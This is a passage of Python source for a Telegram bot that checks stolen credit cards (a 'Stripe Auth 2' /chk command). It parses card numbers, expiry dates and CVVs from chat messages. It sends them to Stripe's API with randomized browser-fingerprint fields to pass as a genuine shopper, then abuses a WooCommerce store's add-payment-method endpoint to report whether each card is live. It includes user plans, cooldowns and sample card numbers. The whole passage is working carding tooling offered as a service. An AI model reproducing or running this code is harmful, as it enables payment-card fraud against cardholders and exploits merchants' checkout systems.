                # Try to parse as direct input if parser fails
                parts = card_details.split()
                if len(parts) >= 1:
                    # Take the first part that looks like a card
                    for part in parts:
                        cc_match = re.search(r'(\d{15,19})', part)
                        if cc_match:
                            cc = cc_match.group(1)
                            # Try to find other components
                            mes_match = re.search(r'(\d{1,2})', card_details[card_details.find(cc)+len(cc):])
                            if mes_match:
                                mes = mes_match.group(1)
                            year_match = re.search(r'(20\d{2}|\d{2})', card_details)
                            if year_match:
                                ano = year_match.group(1)
                                if len(ano) == 2:
                                    ano = '20' + ano
                            cvv_match = re.search(r'(\d{3,4})', card_details)
                            if cvv_match:
                                cvv = cvv_match.group(1)
                            break

            if not cc:
                elapsed = time.time() - start_time
                return await self.format_response("", "", "", "", "ERROR", "No valid card number found in your message", username, elapsed, user_data)

            # Validate card details
            is_valid, validation_msg = SmartCardParser.validate_card_details(cc, mes, ano, cvv)
            if not is_valid:
                elapsed = time.time() - start_time
                return await self.format_response(cc, mes, ano, cvv, "ERROR", validation_msg, username, elapsed, user_data)

            logger.info(f"🔍 Starting Stripe Auth 2 check: {cc[:6]}XXXXXX{cc[-4:]}|{mes}|{ano}|{cvv}")

            # Get BIN info
            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Create authenticated session with improved retry logic
            max_attempts = 3
            session, nonce, session_msg = None, None, ""

            for attempt in range(max_attempts):
                logger.network(f"Session creation attempt {attempt + 1}/{max_attempts}")
                try:
                    session, nonce, session_msg = await self.create_authenticated_session()
                    if nonce:
                        logger.success(f"Session created successfully on attempt {attempt + 1}")
                        break
                except Exception as e:
                    logger.warning(f"Session attempt {attempt + 1} failed: {str(e)[:100]}")
                
                if attempt < max_attempts - 1:
                    wait_time = random.uniform(8.0, 12.0)  # Even longer wait for Ubuntu VPS
                    logger.warning(f"Session failed, waiting {wait_time:.1f}s before retry...")
                    await asyncio.sleep(wait_time)

            if not nonce:
                elapsed = time.time() - start_time
                return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Session failed: {session_msg}", username, elapsed, user_data, bin_info)

            # Create Stripe payment method
            logger.step(5, 6, "Creating Stripe payment method...")

            client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))

            postal_code = random.choice(['10080', '90210', '33101', '60601', '75201', '94102', '98101', '20001'])

            # Format card number with spaces as shown in trace
            formatted_cc = f"{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]}"

            stripe_data = {
                'type': 'card',
                'card[number]': formatted_cc,
                'card[cvc]': cvv,
                'card[exp_year]': ano,
                'card[exp_month]': mes,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': postal_code,
                'billing_details[address][country]': 'US',
                'pasted_fields': 'number',
                'payment_user_agent': f'stripe.js/065b474d33; stripe-js-v3/065b474d33; payment-element; deferred-intent',
                'referrer': self.base_url,
                'time_on_page': str(random.randint(30000, 120000)),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': str(random.randint(2021, 2024)),
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ''.join(random.choices(string.ascii_lowercase + string.digits, k=36)),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': self.stripe_key,
                '_stripe_version': '2024-06-20'
            }

            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.user_agent,
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform,
            }

            logger.stripe("Sending request to Stripe API...")
            await asyncio.sleep(random.uniform(1.0, 2.0))

            # Use a separate session for Stripe API with Ubuntu-optimized settings
            ssl_context = self.create_ssl_context_noverify()
            stripe_connector = aiohttp.TCPConnector(ssl=ssl_context, limit=10)
            stripe_timeout = aiohttp.ClientTimeout(total=60, connect=20, sock_read=40)
            
            async with aiohttp.ClientSession(connector=stripe_connector, timeout=stripe_timeout) as stripe_session:
                async with stripe_session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=stripe_headers,
                    data=stripe_data,
                    timeout=60
                ) as stripe_response:
                    if stripe_response.status != 200:
                        error_text = await stripe_response.text()
                        error_text = error_text[:150] if error_text else "No response"
                        logger.error(f"Stripe API error: {error_text}")
                        await session.close()
                        elapsed = time.time() - start_time
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Stripe Error: {error_text}", username, elapsed, user_data, bin_info)

                    stripe_json = await stripe_response.json()
                    logger.debug_response(f"Stripe Response: {stripe_response.status}")

                    if "error" in stripe_json:
                        error_msg = stripe_json["error"].get("message", "Stripe declined")
                        logger.error(f"Stripe error message: {error_msg}")
                        await session.close()
                        elapsed = time.time() - start_time
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, elapsed, user_data, bin_info)

                    payment_method_id = stripe_json.get("id")
                    if not payment_method_id:
                        logger.error("No payment method ID in Stripe response")
                        await session.close()
                        elapsed = time.time() - start_time
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", username, elapsed, user_data, bin_info)

                    logger.success(f"Payment method created: {payment_method_id}")

                    # Confirm setup intent with website
                    logger.step(6, 6, "Confirming setup intent...")
                    ajax_url = f"{self.base_url}/wp-admin/admin-ajax.php"
                    ajax_headers = self.get_base_headers()
                    ajax_headers.update({
                        'Accept': '*/*',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Origin': self.base_url,
                        'Referer': f"{self.base_url}/my-account/add-payment-method/",
                        'X-Requested-With': 'XMLHttpRequest',
                    })

                    ajax_data = {
                        'action': 'wc_stripe_create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': payment_method_id,
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': nonce
                    }

                    await asyncio.sleep(random.uniform(0.5, 1.0))

                    async with session.post(ajax_url, headers=ajax_headers, data=ajax_data, timeout=45) as ajax_response:
                        await session.close()

                        if ajax_response.status != 200:
                            error_detail = "Bad Request"
                            try:
                                error_json = await ajax_response.json()
                                if isinstance(error_json, dict):
                                    if 'data' in error_json and 'message' in error_json['data']:
                                        error_detail = error_json['data']['message']
                            except:
                                pass

                            logger.error(f"AJAX error: {error_detail}")
                            elapsed = time.time() - start_time
                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {error_detail}", username, elapsed, user_data, bin_info)

                        try:
                            result = await ajax_response.json()
                            logger.debug_response(f"AJAX Response received")

                            logger.step(6, 6, "Analyzing result...")
                            elapsed = time.time() - start_time

                            if result.get("success"):
                                logger.success("Card APPROVED")

                                if (isinstance(result.get("data"), dict) and 
                                    result["data"].get("status") == "requires_action" and
                                    result["data"].get("next_action", {}).get("type") == "use_stripe_sdk" and
                                    "three_d_secure_2_source" in result["data"].get("next_action", {}).get("use_stripe_sdk", {})):

                                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "**Stripe_3ds_Fingerprint**", username, elapsed, user_data, bin_info)

                                return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successful", username, elapsed, user_data, bin_info)
                            else:
                                error_data = result.get("data", {})
                                error_message = "Transaction Declined"

                                if isinstance(error_data, dict):
                                    if "error" in error_data:
                                        error_obj = error_data["error"]
                                        if isinstance(error_obj, dict):
                                            error_message = error_obj.get("message", "Card Declined")
                                        else:
                                            error_message = str(error_obj)
                                    elif "message" in error_data:
                                        error_message = error_data["message"]
                                elif isinstance(error_data, str):
                                    error_message = error_data

                                logger.warning(f"Card DECLINED: {error_message}")
                                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, elapsed, user_data, bin_info)

                        except json.JSONDecodeError as e:
                            logger.error(f"JSON decode error: {str(e)}")
                            elapsed = time.time() - start_time
                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Invalid server response", username, elapsed, user_data, bin_info)

        except asyncio.TimeoutError:
            logger.error("Request timeout")
            if session:
                await session.close()
            elapsed = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, elapsed, user_data, bin_info)
        except aiohttp.ClientConnectorError as e:
            logger.error(f"Connection error: {str(e)}")
            if session:
                await session.close()
            elapsed = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Connection failed", username, elapsed, user_data, bin_info)
        except aiohttp.ServerDisconnectedError:
            logger.error("Server disconnected")
            if session:
                await session.close()
            elapsed = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Server disconnected", username, elapsed, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            if session:
                await session.close()
            elapsed = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, elapsed, user_data, bin_info)

# Command handler for /chk command
@Client.on_message(filters.command(["chk", ".chk", "$chk"]))
@auth_and_free_restricted
async def handle_stripe_auth2(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled (BEFORE any other checks)
        # Import the function from Admins module
        from BOT.helper.Admins import is_command_disabled, get_command_offline_message

        # Get the actual command that was used
        command_text = message.text.split()[0]  # Get /chk or .chk or $chk
        command_name = command_text.lstrip('/.$')  # Extract just 'chk'

        # Check if command is disabled
        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "chk")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        # NO CREDIT DEDUCTION FOR ANY USER - This gate is FREE
        # REMOVED: update_user_credits(user_id) call completely

        # Get the full message text
        full_text = message.text.strip()

        # Remove command part to get just the card details
        command_pattern = r'^/(chk|\.chk|\$chk)\s*'
        card_details = re.sub(command_pattern, '', full_text, flags=re.IGNORECASE)

        if not card_details.strip():
            # If no card details provided, check if there's a replied message
            if message.reply_to_message and message.reply_to_message.text:
                card_details = message.reply_to_message.text
            else:
                await message.reply("""<pre>#WAYNE ─[STRIPE AUTH 2]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/chk</code> or <code>.chk</code> or <code>$chk</code>
⟐ <b>Usage</b>: Send card in ANY format after command
⟐ <b>Examples:</b>
<code>/chk 4111111111111111|12|2025|123</code>
<code>/chk 4355460265778976|01/2028|221</code>
<code>/chk 4232230283582877
06/28
473
VISA
DEBIT</code>
<code>Reply to a message containing card details with /chk</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Smart parser detects cards in ANY format</code>""")
                return

        logger.info(f"User @{username} sent: {card_details[:100]}...")

        # Try to parse card details
        cc, mes, ano, cvv = SmartCardParser.extract_card_from_text(card_details)

        if not cc or not mes or not ano or not cvv:
            # Show what we tried to parse
            await message.reply(f"""<pre>❌ Card Parsing Failed</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Could not extract valid card details from your message.
⟐ <b>Input Received:</b> <code>{card_details[:100]}...</code>
⟐ <b>Try These Formats:</b>
1. <code>4111111111111111|12|2025|123</code>
2. <code>4355460265778976|01/2028|221</code>
3. <code>Card: 4232230283582877
Exp: 06/28
CVV: 473</code>
━━━━━━━━━━━━━""")
            return

        # Validate card details
        is_valid, validation_msg = SmartCardParser.validate_card_details(cc, mes, ano, cvv)
        if not is_valid:
            await message.reply(f"""<pre>❌ Card Validation Failed</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: {validation_msg}
⟐ <b>Parsed:</b> <code>{cc[:6]}XXXXXX{cc[-4:]}|{mes}|{ano}|{cvv}</code>
━━━━━━━━━━━━━""")
            return

        checker = StripeAuth2Checker()
        processing_msg = await message.reply(
            checker.get_processing_message(cc, mes, ano, cvv, username, plan_name)
        )

        result = await checker.check_card(card_details, username, user_data)

        await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        logger.error(f"Command error: {error_msg}")
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")

print("✅ Stripe Auth 2 (chk) loaded successfully!")
